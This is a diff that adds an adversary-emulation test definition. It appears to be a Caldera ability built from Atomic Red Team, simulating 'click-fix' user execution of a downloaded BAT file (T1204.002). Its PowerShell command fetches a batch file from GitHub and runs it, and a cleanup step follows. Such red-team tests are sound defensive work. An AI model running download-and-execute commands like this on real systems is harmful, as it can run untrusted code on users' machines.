@@ -1,0 +1,44 @@
+- id: 22386853-f68d-4b50-a362-de235127c443
+  name: Simulate Click-Fix via Downloaded BAT File
+  description: Simulates user execution of a BAT file downloaded from the Atomic Red
+    Team GitHub repository.This test represents T1204.002 - User Execution via Malicious
+    File.The BAT file performs harmless terminal output to simulate a "fix" operation.
+  tactic: execution
+  technique:
+    attack_id: T1204.002
+    name: 'User Execution: Malicious File'
+  platforms:
+    windows:
+      psh:
+        command: $url = "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/click-fix.bat";
+          $outfile = "$env:TEMP\click-fix.bat"; Invoke-WebRequest -Uri $url -OutFile
+          $outfile -UseBasicParsing; $process = Start-Process -FilePath $outfile -PassThru
+          -WindowStyle Normal; $process.Id | Out-File "$env:TEMP\click-fix-pid.txt"
+        cleanup: if (Test-Path "$env:TEMP\click-fix-pid.txt") {; $pid = Get-Content
+          "$env:TEMP\click-fix-pid.txt"; Stop-Process -Id $pid -Force -ErrorAction
+          SilentlyContinue; Remove-Item "$env:TEMP\click-fix-pid.txt" -ErrorAction
+          SilentlyContinue; }; Remove-Item "#{outfile}" -ErrorAction SilentlyContinue
+        elevation_required: false
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - atomic-red-team
+  - t1204.002
+  - execution
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      url:
+        description: URL to download the BAT file from
+        type: url
+        default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/click-fix.bat
+      outfile:
+        description: Path where the BAT file will be saved
+        type: path
+        default: $env:TEMP\click-fix.bat
+    technique_created: '2020-03-11T14:49:36.954Z'
+    atomic_guid: 22386853-f68d-4b50-a362-de235127c443
+    import_timestamp: '2025-11-01T03:11:54.100096Z'
